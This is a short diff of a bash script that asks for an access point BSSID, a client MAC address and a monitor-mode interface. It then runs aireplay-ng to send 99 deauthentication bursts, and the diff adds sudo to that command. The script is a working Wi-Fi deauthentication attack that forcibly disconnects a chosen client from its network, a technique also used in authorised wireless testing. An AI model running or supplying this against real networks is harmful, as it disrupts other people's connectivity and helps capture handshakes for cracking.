@@ -6,7 +6,7 @@ echo ""
 read BSSID
 [[ $BSSID == "" ]]
 echo ""
-echo "Please enter the device ESSID:"
+echo "Please enter the device STATION MAC ADDRESS:"
 echo ""
 read ESSID
 [[ $ESSID == "" ]]
@@ -16,4 +16,4 @@ echo ""
 read MON
 [[ $MON == "" ]]
 
-aireplay-ng -0 99 -a $BSSID -c $ESSID $MON
+sudo aireplay-ng -0 99 -a $BSSID -c $ESSID $MON
